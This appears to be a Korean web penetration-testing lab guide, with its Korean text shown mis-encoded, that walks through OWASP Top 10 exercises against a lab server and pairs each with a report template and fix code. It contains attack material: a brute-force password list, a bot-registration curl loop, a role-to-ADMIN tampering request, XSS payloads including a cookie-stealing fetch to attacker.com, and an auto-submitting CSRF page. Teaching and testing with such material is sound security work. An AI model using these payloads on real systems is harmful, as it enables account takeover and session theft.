### ğŸ§ª ì‹¤ìŠµ 4-1: ë¸Œë£¨íŠ¸í¬ìŠ¤ ê³µê²©

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: BurpSuite Intruder ì„¤ì •

```http
POST /api/login HTTP/1.1

id=admin&pw=Â§passwordÂ§
```

**Step 2**: Payload (Simple list)

```
123456
password
12345678
qwerty
admin123
Test1234!@
```

**Step 3**: Attack ì‹œì‘ â†’ ê²°ê³¼ ë¶„ì„

**Step 4**: 10íšŒ ì´ìƒ ì‹¤íŒ¨í•´ë„ ì°¨ë‹¨ ì—†ìŒ â†’ ì·¨ì•½!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [ID-001] ë¸Œë£¨íŠ¸í¬ìŠ¤ ê³µê²© ë°©ì–´ ë¶€ì¬

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì·¨ì•½ì  ì„¤ëª…**:  
ë¡œê·¸ì¸ ì‹œë„ íšŸìˆ˜ ì œí•œ ì—†ì–´ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì— ì·¨ì•½

**ì¬í˜„ ë°©ë²•**:
1. BurpSuite Intruderë¡œ íŒ¨ìŠ¤ì›Œë“œ ì‚¬ì „ ê³µê²©
2. 1000íšŒ ì‹œë„í•´ë„ ì°¨ë‹¨ ì—†ìŒ

**ì˜í–¥**:
- ì•½í•œ ë¹„ë°€ë²ˆí˜¸ ê³„ì • íƒˆì·¨
- ì„œë²„ ë¦¬ì†ŒìŠ¤ ì†Œëª¨

**ê¶Œì¥ ì¡°ì¹˜**:
- 5íšŒ ì‹¤íŒ¨ ì‹œ ê³„ì • ì ê¸ˆ (15ë¶„)
- CAPTCHA ì¶”ê°€
- Rate Limiting (IPë‹¹ ë¶„ë‹¹ 10íšŒ)

---

### ğŸ§ª ì‹¤ìŠµ 4-2: ìë™í™” ë´‡ ë°©ì–´ ë¶€ì¬

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ìë™ íšŒì›ê°€ì… ìŠ¤í¬ë¦½íŠ¸

```bash
#!/bin/bash
for i in {1..100}
do
  curl -X POST http://3.34.212.183/api/register \
    -d "user_id=bot$i" \
    -d "name=ë´‡$i" \
    -d "password=Test1234!@" \
    -d "email=bot$i@test.com" \
    -d "role=FREE" \
    -d "phone=010-0000-000$i" \
    -d "address=ì„œìš¸" \
    -d "marketing_yn=N"
  echo "Bot $i registered"
done
```

**Step 2**: ì‹¤í–‰ â†’ 100ê°œ ê³„ì • ìƒì„± ì„±ê³µ â†’ ì·¨ì•½!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [ID-002] ìë™í™” ë´‡ ë°©ì–´ ë¶€ì¬

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì·¨ì•½ì  ì„¤ëª…**:  
CAPTCHAë‚˜ ë³¸ì¸ ì¸ì¦ ì—†ì–´ ìë™í™” ë´‡ìœ¼ë¡œ ëŒ€ëŸ‰ ê³„ì • ìƒì„± ê°€ëŠ¥

**ì¬í˜„ ë°©ë²•**:
1. curl ìŠ¤í¬ë¦½íŠ¸ë¡œ 100ê°œ ê³„ì • ìƒì„±
2. ì°¨ë‹¨ ì—†ì´ ì„±ê³µ

**ì˜í–¥**:
- ìŠ¤íŒ¸ ê³„ì • ìƒì„±
- ì„œë¹„ìŠ¤ ì–´ë·°ì§•

**ê¶Œì¥ ì¡°ì¹˜**:
- Google reCAPTCHA v3
- ì´ë©”ì¼ ì¸ì¦ í•„ìˆ˜í™”
- IPë‹¹ íšŒì›ê°€ì… ì œí•œ (í•˜ë£¨ 3ê°œ)

---

### ğŸ§ª ì‹¤ìŠµ 4-3: role íŒŒë¼ë¯¸í„° ì¡°ì‘ â­ NEW

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `AuthController.java` Line 52

```java
pstmt.setString(5, role);  // í´ë¼ì´ì–¸íŠ¸ ì…ë ¥ê°’ ê·¸ëŒ€ë¡œ ì‚¬ìš©!
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ì •ìƒ íšŒì›ê°€ì… (testuser1 / role=FREE)

**Step 2**: BurpSuiteë¡œ ìš”ì²­ í™•ì¸

```http
POST /api/register HTTP/1.1

user_id=testuser1&...&role=FREE&...
```

**Step 3**: Repeaterë¡œ role ì¡°ì‘

```http
POST /api/register HTTP/1.1

user_id=hacker&name=í•´ì»¤&password=Test1234!@&email=hacker@test.com&role=ADMIN&phone=010-9999-9999&address=Seoul&marketing_yn=N
```

`role=FREE` â†’ `role=ADMIN` ë³€ê²½!

**Step 4**: Send â†’ "íšŒì›ê°€ì… ì„±ê³µ" ğŸ”´ CRITICAL!

**Step 5**: ë¡œê·¸ì¸ â†’ ë§ˆì´í˜ì´ì§€ í™•ì¸

íšŒì› êµ¬ë¶„: **ê´€ë¦¬ì** (ë¹¨ê°„ ë°°ì§€)

**Step 6**: ê´€ë¦¬ì ê¸°ëŠ¥ í…ŒìŠ¤íŠ¸

- ê°•ì˜ìë£Œ ì‘ì„± â†’ ì„±ê³µ!
- ê³µì§€ì‚¬í•­ ì‘ì„± â†’ ì„±ê³µ!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [ID-003] role íŒŒë¼ë¯¸í„° ì¡°ì‘ (ê¶Œí•œ ìƒìŠ¹)

**ìœ„í—˜ë„**: ğŸ”´ CRITICAL

**ì½”ë“œ ìœ„ì¹˜**: `AuthController.java` Line 52

**ì·¨ì•½ì  ì„¤ëª…**:  
íšŒì›ê°€ì… ì‹œ role íŒŒë¼ë¯¸í„°ë¥¼ í´ë¼ì´ì–¸íŠ¸ì—ì„œ ë°›ì•„ ì„œë²„ ì¸¡ ê²€ì¦ ì—†ì´ ì‚¬ìš©í•˜ì—¬, ê³µê²©ìê°€ ê´€ë¦¬ì ê³„ì • ìƒì„± ê°€ëŠ¥

**ì¬í˜„ ë°©ë²•**:
1. íšŒì›ê°€ì… ìš”ì²­ ê°€ë¡œì±„ê¸°
2. role=FREE â†’ role=ADMIN ë³€ê²½
3. ê´€ë¦¬ì ê³„ì • ìƒì„± ì„±ê³µ

**ì˜í–¥**:
- ë¬´ì œí•œ ê´€ë¦¬ì ê³„ì • ìƒì„±
- ëª¨ë“  ê´€ë¦¬ì ê¸°ëŠ¥ ì ‘ê·¼
- ì‹œìŠ¤í…œ ì™„ì „ ì¥ì•…

**ê¶Œì¥ ì¡°ì¹˜**:

ë°©ë²• 1 - ì„œë²„ì—ì„œ role ê°•ì œ ì„¤ì •:

```java
@PostMapping("/api/register")
public String register(...) {
    String fixedRole = "FREE";  // í•˜ë“œì½”ë”©
    pstmt.setString(5, fixedRole);
}
```

ë°©ë²• 2 - role íŒŒë¼ë¯¸í„° ìì²´ë¥¼ ë°›ì§€ ì•Šê¸°:

```java
@PostMapping("/api/register")
public String register(
    @RequestParam String userId,
    @RequestParam String name,
    @RequestParam String password,
    // role íŒŒë¼ë¯¸í„° ì œê±°!
    ...
) {
    pstmt.setString(5, "FREE");  // í•­ìƒ FREEë¡œ ì„¤ì •
}
```

ë°©ë²• 3 - í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦:

```java
Set<String> allowedRoles = Set.of("FREE", "PAID");
if (!allowedRoles.contains(role)) {
    role = "FREE";
}
// ADMINì€ ì ˆëŒ€ í—ˆìš© ì•ˆ í•¨
pstmt.setString(5, role);
```

---

## A05: Security Misconfiguration

### ğŸ“– ì´ë¡ 

ì„œë²„, í”„ë ˆì„ì›Œí¬, ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ì˜ëª»ëœ ì„¤ì •

### ğŸ¯ í…ŒìŠ¤íŠ¸ ëŒ€ìƒ

- ë””ë ‰í† ë¦¬ ë¦¬ìŠ¤íŒ…
- ì—ëŸ¬ í˜ì´ì§€ ì •ë³´ ë…¸ì¶œ
- HTTP ë©”ì†Œë“œ
- ë¶ˆí•„ìš”í•œ íŒŒì¼

---

### ğŸ§ª ì‹¤ìŠµ 5-1: ë””ë ‰í† ë¦¬ ë¦¬ìŠ¤íŒ…

#### ì‹¤ìŠµ ë‹¨ê³„

```bash
curl http://3.34.212.183/static/
curl http://3.34.212.183/upload/
curl http://3.34.212.183/files/
```

- ëª©ë¡ ë‚˜ì˜¤ë©´ ì·¨ì•½ ğŸ”´
- 403 Forbidden â†’ ì•ˆì „ âœ…

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [MISC-001] ë””ë ‰í† ë¦¬ ë¦¬ìŠ¤íŒ… í™œì„±í™”

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì¬í˜„ ë°©ë²•**: /upload/ ì ‘ì† ì‹œ íŒŒì¼ ëª©ë¡ ë…¸ì¶œ

**ì˜í–¥**: ë°±ì—… íŒŒì¼, ì„¤ì • íŒŒì¼ ë‹¤ìš´ë¡œë“œ ê°€ëŠ¥

**ê¶Œì¥ ì¡°ì¹˜**:

Nginx:

```nginx
location / {
    autoindex off;
}
```

Tomcat web.xml:

```xml
<init-param>
    <param-name>listings</param-name>
    <param-value>false</param-value>
</init-param>
```

---

### ğŸ§ª ì‹¤ìŠµ 5-2: ì—ëŸ¬ ë©”ì‹œì§€ ë…¸ì¶œ

#### ì‹¤ìŠµ ë‹¨ê³„

```bash
curl http://3.34.212.183/api/nonexistent
```

**ì˜ˆìƒ ê²°ê³¼**:

```
Whitelabel Error Page
type=Not Found, status=404
timestamp=2025-01-02T10:30:00
```

â†’ Spring Boot ë²„ì „, ìŠ¤íƒ íŠ¸ë ˆì´ìŠ¤ ë…¸ì¶œ!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [MISC-002] ìƒì„¸ ì—ëŸ¬ ë©”ì‹œì§€ ë…¸ì¶œ

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì¬í˜„ ë°©ë²•**: ì¡´ì¬í•˜ì§€ ì•ŠëŠ” URL ì ‘ì† â†’ Whitelabel Error Page

**ì˜í–¥**: ê¸°ìˆ  ìŠ¤íƒ ë…¸ì¶œ (Spring Boot, MariaDB)

**ê¶Œì¥ ì¡°ì¹˜**:

application.properties:

    server.error.include-message=never
    server.error.include-stacktrace=never
    server.error.whitelabel.enabled=false

---

## A06: Vulnerable Components

### ğŸ“– ì´ë¡ 

ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬/í”„ë ˆì„ì›Œí¬ ì‚¬ìš©

### ğŸ§ª ì‹¤ìŠµ 6-1: ì„œë²„ ë²„ì „ ì •ë³´

```bash
curl -I http://3.34.212.183/
```

**ì˜ˆìƒ**: Server: nginx/1.18.0 (Ubuntu)

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [VULN-001] ì„œë²„ ë²„ì „ ì •ë³´ ë…¸ì¶œ

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì˜í–¥**: ê³µê²©ìì—ê²Œ íƒ€ê²Ÿ ì •ë³´ ì œê³µ

**ê¶Œì¥ ì¡°ì¹˜**:

Nginx:

    server_tokens off;

Spring Boot:

    server.server-header=

---

## A07: Authentication Failures

### ğŸ“– ì´ë¡ 

ì¸ì¦ ë° ì„¸ì…˜ ê´€ë¦¬ ì·¨ì•½ì 

### ğŸ§ª ì‹¤ìŠµ 7-1: ì„¸ì…˜ ê³ ì •

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ë¡œê·¸ì¸ ì „ JSESSIONID í™•ì¸ (ABC123)

**Step 2**: ë¡œê·¸ì¸

**Step 3**: JSESSIONID í™•ì¸
- ë³€ê²½ ì•ˆë¨ â†’ ì·¨ì•½ ğŸ”´
- ìƒˆë¡œ ìƒì„± â†’ ì•ˆì „ âœ…

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [AUTH-001] ì„¸ì…˜ ê³ ì • ì·¨ì•½ì 

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì¬í˜„ ë°©ë²•**: ë¡œê·¸ì¸ ì „í›„ JSESSIONID ë™ì¼

**ê¶Œì¥ ì¡°ì¹˜**:

```java
@PostMapping("/api/login")
public String login(HttpServletRequest request) {
    // ê¸°ì¡´ ì„¸ì…˜ ë¬´íš¨í™”
    HttpSession oldSession = request.getSession(false);
    if (oldSession != null) {
        oldSession.invalidate();
    }

    // ìƒˆ ì„¸ì…˜ ìƒì„±
    HttpSession newSession = request.getSession(true);
    newSession.setAttribute("loginUser", userId);
}
```

---

### ğŸ§ª ì‹¤ìŠµ 7-2: ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ë¡œê·¸ì¸ â†’ 30ë¶„ ëŒ€ê¸°

**Step 2**: ìƒˆë¡œê³ ì¹¨ â†’ ì—¬ì „íˆ ë¡œê·¸ì¸ ìƒíƒœë©´ ì·¨ì•½

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [AUTH-002] ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ë¯¸ì„¤ì •

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ê¶Œì¥ ì¡°ì¹˜**:

application.properties:

    server.servlet.session.timeout=30m

---

### ğŸ§ª ì‹¤ìŠµ 7-3: ì•½í•œ ë¹„ë°€ë²ˆí˜¸ ì •ì±…

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: BurpSuiteë¡œ íšŒì›ê°€ì… ìš”ì²­ ê°€ë¡œì±„ê¸°

**Step 2**: passwordë¥¼ `1234`ë¡œ ë³€ê²½

**Step 3**: íšŒì›ê°€ì… ì„±ê³µ â†’ ì·¨ì•½ ğŸ”´

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [AUTH-003] ì•½í•œ ë¹„ë°€ë²ˆí˜¸ ì •ì±… (ì„œë²„ ì¸¡ ë¯¸ê²€ì¦)

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì½”ë“œ ìœ„ì¹˜**: í´ë¼ì´ì–¸íŠ¸ë§Œ ê²€ì¦, ì„œë²„ ê²€ì¦ ì—†ìŒ

**ê¶Œì¥ ì¡°ì¹˜**:

```java
@PostMapping("/api/register")
public String register(..., @RequestParam String password, ...) {
    if (password.length() < 8) {
        return "ë¹„ë°€ë²ˆí˜¸ëŠ” ìµœì†Œ 8ì ì´ìƒ";
    }
    if (!password.matches(".*[A-Z].*")) {
        return "ëŒ€ë¬¸ì í¬í•¨ í•„ìˆ˜";
    }
    if (!password.matches(".*[0-9].*")) {
        return "ìˆ«ì í¬í•¨ í•„ìˆ˜";
    }
    if (!password.matches(".*[!@#$%^&*].*")) {
        return "íŠ¹ìˆ˜ë¬¸ì í¬í•¨ í•„ìˆ˜";
    }
}
```

---

## A08: Data Integrity Failures

### ğŸ“– ì´ë¡ 

ë°ì´í„°/ì½”ë“œ ë¬´ê²°ì„±ì„ ê²€ì¦í•˜ì§€ ì•Šì•„ ë°œìƒí•˜ëŠ” ì·¨ì•½ì 

### ğŸ§ª ì‹¤ìŠµ 8-1: íŒŒì¼ ì—…ë¡œë“œ âš ï¸ í˜„ì¬ ë¯¸êµ¬í˜„

**í˜„ì¬ ìƒíƒœ**: íŒŒì¼ ì—…ë¡œë“œ ê¸°ëŠ¥ ë¯¸êµ¬í˜„

HTMLì— `<input type="file">`ì´ ìˆì§€ë§Œ ë°±ì—”ë“œ ë¯¸êµ¬í˜„

**í–¥í›„ êµ¬í˜„ ì‹œ í…ŒìŠ¤íŠ¸**:
- ì›¹ì‰˜ ì—…ë¡œë“œ (shell.jsp)
- í™•ì¥ì ê²€ì¦ ìš°íšŒ
- MIME íƒ€ì… ê²€ì¦

---

### ğŸ§ª ì‹¤ìŠµ 8-2: role íŒŒë¼ë¯¸í„° ë¬´ê²°ì„± ê²€ì¦ ë¶€ì¬

â†’ A04 ì‹¤ìŠµ 4-3ê³¼ ë™ì¼

í´ë¼ì´ì–¸íŠ¸ ë°ì´í„°ë¥¼ ì„œë²„ê°€ ì‹ ë¢°í•¨ (ë¬´ê²°ì„± ê²€ì¦ ì—†ìŒ)

---

## A09: Logging Failures

### ğŸ“– ì´ë¡ 

ë³´ì•ˆ ì´ë²¤íŠ¸ì— ëŒ€í•œ ë¡œê¹…/ëª¨ë‹ˆí„°ë§ ë¶€ì¬

### ğŸ§ª ì‹¤ìŠµ 9-1: ë¡œê·¸ì¸ ì‹¤íŒ¨ ë¡œê¹…

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ë¡œê·¸ì¸ 10íšŒ ì‹¤íŒ¨

**Step 2**: ì„œë²„ ë¡œê·¸ í™•ì¸

```bash
tail -f /var/log/app/security.log
```

ë¡œê·¸ ì—†ìœ¼ë©´ â†’ ì·¨ì•½!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [LOG-001] ë³´ì•ˆ ì´ë²¤íŠ¸ ë¡œê¹… ë¶€ì¬

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì¬í˜„ ë°©ë²•**: ë¡œê·¸ì¸ ì‹¤íŒ¨í•´ë„ ë¡œê·¸ ì—†ìŒ

**ì˜í–¥**: ê³µê²© íƒì§€ ë¶ˆê°€, ì‚¬ê³  ì¶”ì  ë¶ˆê°€

**ê¶Œì¥ ì¡°ì¹˜**:

```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

private static final Logger logger = LoggerFactory.getLogger(AuthController.class);

// ë¡œê·¸ì¸ ì‹¤íŒ¨ ì‹œ
logger.warn("Login failed for user: {} from IP: {}", id, request.getRemoteAddr());
```

---

## A10: SSRF

### ğŸ“– ì´ë¡ 

ì„œë²„ê°€ ê³µê²©ìê°€ ì§€ì •í•œ URLë¡œ ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ë§Œë“œëŠ” ì·¨ì•½ì 

**í˜„ì¬ ìƒíƒœ**: í•´ë‹¹ ê¸°ëŠ¥ ì—†ìŒ

---

## ì¶”ê°€ ì·¨ì•½ì 

### XSS (Cross-Site Scripting)

#### ğŸ§ª ì‹¤ìŠµ XSS-1: Stored XSS

**ì½”ë“œ ìœ„ì¹˜**: 
- Backend: `InquiryController.java` Line 24-32
- Frontend: `board.html` Line 214

```javascript
titleHtml = `<a href="inquiry_view.html?id=${item.id}">${item.title}</a>`;
// â†‘ ì´ìŠ¤ì¼€ì´í”„ ì—†ìŒ!
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ì œëª©ì— ì…ë ¥

```html
<script>alert(document.cookie)</script>
```

ë˜ëŠ”

```html
<img src=x onerror="alert(document.cookie)">
```

**Step 2**: ë“±ë¡ â†’ ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ëª©ë¡ ì¡°íšŒ ì‹œ alert ì‹¤í–‰!

**Step 3**: ì¿ í‚¤ íƒˆì·¨ í˜ì´ë¡œë“œ

```html
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [XSS-001] Stored XSS (ë¬¸ì˜ê¸€)

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì½”ë“œ ìœ„ì¹˜**: 
- `InquiryController.java` Line 24-32
- `board.html` Line 214

**ì¬í˜„ ë°©ë²•**:
1. ì œëª©ì— `<script>alert(1)</script>` ì…ë ¥
2. ë‹¤ë¥¸ ì‚¬ìš©ì ì¡°íšŒ ì‹œ ì‹¤í–‰

**ì˜í–¥**:
- ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨ â†’ ê³„ì • íƒˆì·¨
- í”¼ì‹± í˜ì´ì§€ ì‚½ì…

**ê¶Œì¥ ì¡°ì¹˜**:

Backend:

```java
import org.apache.commons.text.StringEscapeUtils;
String safeTitle = StringEscapeUtils.escapeHtml4(title);
```

Frontend:

```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

titleHtml = `<a href="...">${escapeHtml(item.title)}</a>`;
```

CSP:

```java
http.headers()
    .contentSecurityPolicy("default-src 'self'; script-src 'self'");
```

---

### CSRF (Cross-Site Request Forgery)

#### ğŸ§ª ì‹¤ìŠµ CSRF-1: ë¹„ë°€ë²ˆí˜¸ ë³€ê²½

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ì •ìƒ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ìš”ì²­ í™•ì¸

```http
PUT /api/member/password HTTP/1.1
Cookie: JSESSIONID=xxxxx

{"password":"newpass123"}
```

**Step 2**: CSRF í† í° í™•ì¸ â†’ ì—†ìœ¼ë©´ ì·¨ì•½ ğŸ”´

**Step 3**: ê³µê²© HTML ì‘ì„±

```html
<!DOCTYPE html>
<html>
<body>
<h1>ë¬´ë£Œ ì¿ í° ë°›ê¸°!</h1>
<form id="csrf" action="http://3.34.212.183/api/member/password" method="POST">
    <input type="hidden" name="password" value="hacked123">
</form>
<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [CSRF-001] ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ CSRF

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì¬í˜„ ë°©ë²•**:
1. ë¡œê·¸ì¸ ìƒíƒœ ìœ ì§€
2. ì•…ì„± HTML í˜ì´ì§€ ë°©ë¬¸
3. ìë™ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½

**ê¶Œì¥ ì¡°ì¹˜**:

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
        return http.build();
    }
}
```

Frontend:

```javascript
function getCsrfToken() {
    return document.cookie
        .split('; ')
        .find(row => row.startsWith('XSRF-TOKEN='))
        ?.split('=')[1];
}

fetch('/api/member/password', {
    headers: {
        'X-XSRF-TOKEN': getCsrfToken()
    },
    ...
});
```

---

## ìµœì¢… ë³´ê³ ì„œ

### ë³´ê³ ì„œ êµ¬ì¡°

**Executive Summary**:
- ì§„ë‹¨ ê¸°ê°„: 2025-01-XX ~ 2025-01-XX
- ì§„ë‹¨ ëŒ€ìƒ: http://3.34.212.183/
- ì§„ë‹¨ í•­ëª©: OWASP TOP 10 + ì¶”ê°€ ì·¨ì•½ì 
- ë°œê²¬ ì·¨ì•½ì : ì´ XXê°œ (Critical: X, High: X, Medium: X, Low: X)

**ì·¨ì•½ì  í†µê³„**:

| ìœ„í—˜ë„ | ê°œìˆ˜ | ë¹„ìœ¨ |
|--------|------|------|
| ğŸ”´ Critical | X | XX% |
| ğŸ”´ High | X | XX% |
| ğŸŸ¡ Medium | X | XX% |
| ğŸŸ¢ Low | X | XX% |

**ì¡°ì¹˜ ìš°ì„ ìˆœìœ„**:

ì¦‰ì‹œ ì¡°ì¹˜ (CRITICAL):
1. [SQLi-001] ë¡œê·¸ì¸ SQL Injection
2. [CRYPTO-002] ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ì €ì¥
3. [ID-003] role íŒŒë¼ë¯¸í„° ì¡°ì‘

1ì£¼ì¼ ë‚´ (HIGH):
4. [BAC-003] ê³µì§€ì‚¬í•­ ê¶Œí•œ ë¯¸ê²€ì¦
5. [XSS-001] Stored XSS
6. [CRYPTO-001] HTTP í‰ë¬¸ í†µì‹ 

2ì£¼ì¼ ë‚´ (MEDIUM):
7. [AUTH-002] ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ
8. [CSRF-001] CSRF
9. [ID-001] ë¸Œë£¨íŠ¸í¬ìŠ¤

---

## í•™ìŠµ ìë£Œ

**ì¶”ì²œ ë„êµ¬**:
- BurpSuite Pro
- OWASP ZAP
- sqlmap

**ì°¸ê³  ì‚¬ì´íŠ¸**:
- OWASP TOP 10: https://owasp.org/Top10/
- PortSwigger Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/

**í•œêµ­ì–´ ìë£Œ**:
- KISA: https://www.kisa.or.kr/
- ë³´ì•ˆë‰´ìŠ¤: https://www.boannews.com/

---

## ì‹¤ìŠµ ì²´í¬ë¦¬ìŠ¤íŠ¸

### ğŸ”´ í•„ìˆ˜ ì‹¤ìŠµ

- [ ] [SQLi-001] ë¡œê·¸ì¸ SQL Injection
- [ ] [CRYPTO-002] ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ì €ì¥
- [ ] [ID-003] role íŒŒë¼ë¯¸í„° ì¡°ì‘ â­
- [ ] [BAC-003] ê³µì§€ì‚¬í•­ ê¶Œí•œ ë¯¸ê²€ì¦ â­
- [ ] [XSS-001] Stored XSS
- [ ] [CRYPTO-001] HTTP í‰ë¬¸ í†µì‹ 
- [ ] [AUTH-001] ì„¸ì…˜ ê³ ì •

### ğŸŸ¡ ê¶Œì¥ ì‹¤ìŠµ

- [ ] [BAC-002] ê´€ë¦¬ì ë¹„ë°€ê¸€
- [ ] [SQLi-002] ë¬¸ì˜ê¸€ SQL Injection
- [ ] [ID-001] ë¸Œë£¨íŠ¸í¬ìŠ¤
- [ ] [MISC-001] ë””ë ‰í† ë¦¬ ë¦¬ìŠ¤íŒ…
- [ ] [AUTH-002] ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ
- [ ] [CSRF-001] CSRF

### ğŸŸ¢ ì„ íƒ ì‹¤ìŠµ

- [ ] [IDOR-001] ìˆœì°¨ì  ID
- [ ] [VULN-001] ë²„ì „ ë…¸ì¶œ

---

**âœ… ìˆ˜ì • ì™„ë£Œ!**

**ì‘ì„±ì**: ì§„ë‹¨íŒ€  
**ì‘ì„±ì¼**: 2025-01-02  
**ë²„ì „**: 2.1 (ë§ˆí¬ë‹¤ìš´ ìˆ˜ì •ë³¸)
